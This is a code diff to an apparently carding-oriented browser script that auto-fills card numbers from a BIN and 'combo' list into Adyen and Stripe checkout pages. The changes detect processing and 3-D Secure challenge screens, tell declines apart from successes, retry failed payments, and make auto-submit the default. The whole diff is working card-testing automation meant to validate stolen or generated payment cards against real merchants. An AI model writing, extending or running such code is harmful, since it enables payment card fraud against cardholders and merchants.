@@ -1007,6 +1007,17 @@
     });
   }
 
+  function isProcessing() {
+    try {
+      const t = (document.body ? document.body.innerText : "").toLowerCase();
+      if (/processing|redirecting|please wait|authoris|verifying|validating|submitting|sending|almost done|just a moment|holding on/.test(t)) return true;
+      const btn = findPayButton();
+      if (btn && btn.disabled) return true;
+      if (document.querySelector("button.adyen-checkout__button[disabled], [class*='adyen-checkout__spinner'], [class*='spinner'][class*='pay'], [class*='adyen-checkout__payment-holder'][class*='spinner']")) return true;
+    } catch (e) {}
+    return false;
+  }
+
   function logButtons() {
     const out = [];
     const buttons = Array.from(document.querySelectorAll(
@@ -1120,7 +1131,9 @@
     const all = (topDocText() + " " + texts.join(" ")).toLowerCase();
     const html = topDocHtml();
 
-    if (/adyen-checkout__threeds2|threeds2|3d-secure|\b3ds\b|threeds|challenge/.test(html)) {
+    if (/adyen-checkout__threeds2/.test(html) ||
+        (/3-?d\s*secure|3ds challenge|authenticate your|verification required|complete (verification|your payment|your purchase)|enter (the )?(sms|code|otp|one-?time)|submit the (code|otp)|please complete your 3\/(ds )?security|confirm (your )?(payment|purchase|verification)/.test(all) &&
+         !/(declined|refused|failed|unable|unsuccessful|restricted|do not honor)/.test(all))) {
       return { ok: true, label: "3DS CHALLENGE" };
     }
     const good = [
@@ -2187,7 +2200,7 @@
       }
 
       let submitted = false;
-      if (cfg.autoSubmit && st.any) {
+      if (cfg.autoSubmit !== false && st.any) {
         submitted = await tryPayHard(card);
         if (!submitted) {
           window.__nonoLog && window.__nonoLog("Pay still dead, re-fill + hard pay round 2...");
@@ -2325,7 +2338,7 @@
     const cfg = await getConfig();
     if (cfg) {
       const ids = ["nono-bin", "nono-combo", "nono-holder", "nono-email", "nono-country", "nono-postal", "nono-stripe-url", "nono-len", "nono-autosubmit", "nono-autoonload"];
-      const vals = [cfg.bin || "", cfg.combo || "", cfg.holder || "", cfg.email || "", cfg.country || "", cfg.postal || "", cfg.stripeUrl || "", String(cfg.cardLength || 0), !!cfg.autoSubmit, !!cfg.autoOnLoad];
+      const vals = [cfg.bin || "", cfg.combo || "", cfg.holder || "", cfg.email || "", cfg.country || "", cfg.postal || "", cfg.stripeUrl || "", String(cfg.cardLength || 0), cfg.autoSubmit == null ? true : !!cfg.autoSubmit, !!cfg.autoOnLoad];
       ids.forEach((id, i) => {
         const e = document.getElementById(id);
         if (e) {
